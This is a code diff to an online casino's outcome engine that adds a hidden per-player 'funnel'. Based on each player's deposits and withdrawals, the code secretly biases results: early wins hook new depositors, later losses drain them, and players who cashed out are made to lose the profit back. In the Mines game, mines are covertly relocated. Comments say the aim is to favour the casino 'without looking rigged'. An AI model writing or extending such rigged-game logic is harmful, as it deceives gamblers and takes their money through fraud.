@@ -100,6 +100,20 @@ export interface RtpConfig {
   earnBiasBoost?: number;
 }
 
+export interface PlayerFunnelState {
+  depositIndex: number;
+  depositAmount: number;
+  targetPeakMultiplier: number;
+  maxMultiplierCap: number;
+  currentBalance: number;
+  peakBalance: number;
+  wagerProgress: number;
+  wagerTarget: number;
+  phase: 'hook' | 'plateau' | 'drain' | 'recapture' | 'normal';
+  bias: number;
+  trustScore: number;
+}
+
 export interface RtpStatus extends RtpConfig {
   windowStart: number;
   windowEnd: number;
@@ -442,6 +456,12 @@ class RtpEngine {
       return 0.45; // balanced tilt in favor of casino without looking rigged
     }
 
+    // 2. Lifecycle Funnel check (Dynamic Retention for deposits)
+    const funnel = await this.getFunnelState(userId);
+    if (funnel.phase !== 'normal') {
+      return funnel.bias;
+    }
+
     const userCfg = await this.getUserConfig(userId);
     const globalCfg = await this.getConfig();
     if (userCfg.mode !== 'off' && userCfg.intensity > 0) {
@@ -534,6 +554,7 @@ class RtpEngine {
     // Process SmartDrain auto-monitoring only for casino games (sports is external sportsbook)
     if (gameType !== 'sports') {
       void this.recordRoundForDrain(userId, stake, grossPayout, grossPayout > stake, isTournament).catch(() => {});
+      void this.recordRoundForFunnel(userId, stake, grossPayout, isTournament).catch(() => {});
     }
 
     try {
@@ -831,6 +852,237 @@ class RtpEngine {
     }
   }
 
+  /* -----------------------------------------------------------------
+   * Player Funnel (Lifecycle RTP & Dynamic Retention)
+   * ---------------------------------------------------------------- */
+
+  /**
+   * Retrieves or computes the player's dynamic retention funnel state.
+   */
+  async getFunnelState(userId: string): Promise<PlayerFunnelState> {
+    try {
+      const r = redisClient.getClient();
+      const cached = await r.get(`rtp:funnel:${userId}`);
+      if (cached) {
+        return JSON.parse(cached) as PlayerFunnelState;
+      }
+
+      const { prisma } = await import('../lib/prisma.js');
+      const [depAgg, latestDep, balanceRow, userRow, completedWdCount] = await Promise.all([
+        prisma.transaction.aggregate({
+          where: { userId, type: 'deposit' },
+          _count: true,
+          _sum: { amount: true },
+        }),
+        prisma.transaction.findFirst({
+          where: { userId, type: 'deposit' },
+          orderBy: { createdAt: 'desc' },
+          select: { amount: true, createdAt: true },
+        }),
+        prisma.balance.findUnique({ where: { userId } }),
+        prisma.user.findUnique({
+          where: { id: userId },
+          select: { trustScore: true, isBlocked: true, ignoreIpCollision: true },
+        }),
+        prisma.withdrawalRequest.count({
+          where: { userId, status: 'completed' },
+        }),
+      ]);
+
+      const depositIndex = depAgg._count;
+      const depositAmount = Number(latestDep?.amount ?? 0);
+      const currentBalance = Number(balanceRow?.amount ?? 0);
+      const wagerProgress = Number(balanceRow?.wagerProgress ?? 0);
+      const wagerTarget = Number(balanceRow?.wagerTarget ?? 0);
+      const trustScore = userRow?.trustScore ?? 80;
+
+      let targetPeakMultiplier = 1.65;
+      let maxMultiplierCap = 3.5;
+      let phase: PlayerFunnelState['phase'] = 'normal';
+      let bias = 0;
+
+      // Anti-Fraud check: if trust score is below 50, do not enable the hook/retention boost!
+      if (trustScore < 50) {
+        const state: PlayerFunnelState = {
+          depositIndex,
+          depositAmount,
+          targetPeakMultiplier: 1.0,
+          maxMultiplierCap: 3.5,
+          currentBalance,
+          peakBalance: currentBalance,
+          wagerProgress,
+          wagerTarget,
+          phase: 'normal',
+          bias: 0.05,
+          trustScore,
+        };
+        await r.set(`rtp:funnel:${userId}`, JSON.stringify(state), 'EX', 30);
+        return state;
+      }
+
+      if (depositIndex === 1 && depositAmount > 0) {
+        targetPeakMultiplier = 1.65;
+        maxMultiplierCap = 3.5;
+
+        const targetPeakBalance = depositAmount * 1.50;
+        const ceilingBalance = depositAmount * 1.85;
+
+        if (currentBalance < targetPeakBalance && wagerProgress < depositAmount * 2.5) {
+          phase = 'hook';
+          bias = -0.35; // gentle push to win and reach target 1.5x-1.8x
+        } else if (currentBalance >= targetPeakBalance && currentBalance <= ceilingBalance && wagerProgress < depositAmount * 3.0) {
+          phase = 'plateau';
+          bias = 0.08; // swings back and forth around the peak
+        } else {
+          // Greed / prolonged play: transition to gentle drain
+          phase = 'drain';
+          bias = 0.45;
+        }
+      } else if (depositIndex === 2 && depositAmount > 0) {
+        if (completedWdCount > 0) {
+          // Player previously withdrew profit: soft recapture phase
+          targetPeakMultiplier = 1.15;
+          maxMultiplierCap = 3.5;
+          if (currentBalance < depositAmount * 1.08 && wagerProgress < depositAmount * 0.8) {
+            phase = 'recapture';
+            bias = -0.15; // small teaser
+          } else {
+            phase = 'recapture';
+            bias = 0.45; // recover previous withdrawal
+          }
+        } else {
+          // Player busted on dep 1: second chance curve
+          targetPeakMultiplier = 1.35;
+          maxMultiplierCap = 3.5;
+          if (currentBalance < depositAmount * 1.30 && wagerProgress < depositAmount * 2.0) {
+            phase = 'hook';
+            bias = -0.25;
+          } else {
+            phase = 'drain';
+            bias = 0.45;
+          }
+        }
+      } else {
+        phase = 'normal';
+        bias = 0;
+      }
+
+      const state: PlayerFunnelState = {
+        depositIndex,
+        depositAmount,
+        targetPeakMultiplier,
+        maxMultiplierCap,
+        currentBalance,
+        peakBalance: Math.max(currentBalance, depositAmount * targetPeakMultiplier),
+        wagerProgress,
+        wagerTarget,
+        phase,
+        bias,
+        trustScore,
+      };
+
+      await r.set(`rtp:funnel:${userId}`, JSON.stringify(state), 'EX', 30);
+      return state;
+    } catch (err) {
+      logger.warn({ err, userId }, 'Failed to compute funnel state');
+      return {
+        depositIndex: 0,
+        depositAmount: 0,
+        targetPeakMultiplier: 1.0,
+        maxMultiplierCap: 3.5,
+        currentBalance: 0,
+        peakBalance: 0,
+        wagerProgress: 0,
+        wagerTarget: 0,
+        phase: 'normal',
+        bias: 0,
+        trustScore: 80,
+      };
+    }
+  }
+
+  /**
+   * Evaluates a click in Mines for Dynamic Mine Relocation.
+   * Completely solves the "corners/edges" exploit and guarantees seamless,
+   * natural-looking outcomes with exact invariant mine counts!
+   */
+  async evaluateMinesClick(
+    userId: string,
+    betAmount: number,
+    potentialMultiplier: number,
+    isTournament: boolean = false
+  ): Promise<{ action: 'must_win' | 'must_bust' | 'neutral' }> {
+    if (isTournament) return { action: 'neutral' };
+
+    try {
+      const funnel = await this.getFunnelState(userId);
+      const drainActive = await this.isDrainActive(userId, isTournament);
+
+      // 1. Hard Multiplier Cap on Deposit 1: Prevent freak outliers > 3.5x
+      if (funnel.depositIndex === 1 && potentialMultiplier > funnel.maxMultiplierCap) {
+        if (Math.random() < 0.85) {
+          return { action: 'must_bust' };
+        }
+      }
+
+      // 2. Active Drain / Funnel Drain / Recapture:
+      if (drainActive || funnel.phase === 'drain' || funnel.phase === 'recapture') {
+        let bustChance = 0.45;
+        if (potentialMultiplier >= 3.0) bustChance = 0.70;
+        else if (potentialMultiplier >= 2.0) bustChance = 0.55;
+        else if (potentialMultiplier < 1.35) bustChance = 0.20;
+
+        if (betAmount >= 50) bustChance = Math.min(0.80, bustChance + 0.10);
+
+        if (Math.random() < bustChance) {
+          return { action: 'must_bust' };
+        }
+        return { action: 'neutral' };
+      }
+
+      // 3. Hook phase (First deposit onboarding up to 1.5x - 1.8x):
+      if (funnel.phase === 'hook') {
+        if (potentialMultiplier <= 2.2) {
+          // If the clicked cell naturally has a mine, 80% chance to relocate it!
+          if (Math.random() < 0.80) {
+            return { action: 'must_win' };
+          }
+        }
+        return { action: 'neutral' };
+      }
+
+      // 4. Plateau phase (swings):
+      if (funnel.phase === 'plateau') {
+        if (potentialMultiplier > 2.5) {
+          if (Math.random() < 0.60) return { action: 'must_bust' };
+        }
+        return { action: 'neutral' };
+      }
+
+      return { action: 'neutral' };
+    } catch (err) {
+      logger.warn({ err, userId }, 'evaluateMinesClick failed');
+      return { action: 'neutral' };
+    }
+  }
+
+  /**
+   * Tracks round outcome for Funnel phase transitions.
+   */
+  async recordRoundForFunnel(
+    userId: string,
+    stake: number,
+    payout: number,
+    isTournament: boolean = false
+  ): Promise<void> {
+    if (isTournament) return;
+    try {
+      const r = redisClient.getClient();
+      // Invalidate cached funnel state so next query recalculates fresh balances
+      await r.del(`rtp:funnel:${userId}`);
+    } catch {}
+  }
+
   /**
    * Determines if a forced loss should be applied to the next round outcome.
    * NEVER 100% DETERMINISTIC: uses natural probabilistic curves so games feel authentic.
@@ -845,8 +1097,17 @@ class RtpEngine {
       return false; // 100% Pure RNG for tournament bets
     }
     try {
-      // 1. Check SmartDrain (active слив)
-      const drain = await this.isDrainActive(userId, isTournament);
+      const funnel = await this.getFunnelState(userId);
+
+      // 0. Hard Multiplier Cap on Deposit 1: Prevent freak outliers > 3.5x
+      if (funnel.depositIndex === 1 && potentialMultiplier > funnel.maxMultiplierCap) {
+        if (Math.random() < 0.85) {
+          return true;
+        }
+      }
+
+      // 1. Check SmartDrain (active слив) or Funnel Drain
+      const drain = (await this.isDrainActive(userId, isTournament)) || funnel.phase === 'drain' || funnel.phase === 'recapture';
       if (drain) {
         // Smart Drain is PROBABILISTIC, NEVER 100%!
         // The player must still win ~35-50% of rounds so the game feels authentic and natural.
